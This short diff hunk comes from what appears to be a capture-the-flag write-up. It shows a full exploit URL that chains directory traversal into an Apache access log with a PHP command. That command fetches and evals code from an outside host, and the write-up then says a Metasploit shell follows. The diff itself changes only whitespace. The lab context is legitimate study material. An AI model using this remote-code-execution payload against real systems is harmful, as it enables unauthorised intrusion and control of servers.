@@ -126,7 +126,7 @@ run
 It will give us a payload to write after "&c=" to get shell. There is the full url:
 ```bash
 http://10.82.133.126/?view=dog/../../../../../../../var/log/apache2/access.log&ext=&c=php%20-d%20allow_url_fopen=true%20-r%20%22eval(file_get_contents(%27http://192.168.167.246:8081/6Udc5bpyEps%27,%20false,%20stream_context_create([%27ssl%27=%3E[%27verify_peer%27=%3Efalse,%27verify_peer_name%27=%3Efalse]])));%22
-```
+```  
 Yeahh, we successfully get a shell. All we need is to write "sessions -i 1" and then, "shell".  
 ----
 ## Flag 1
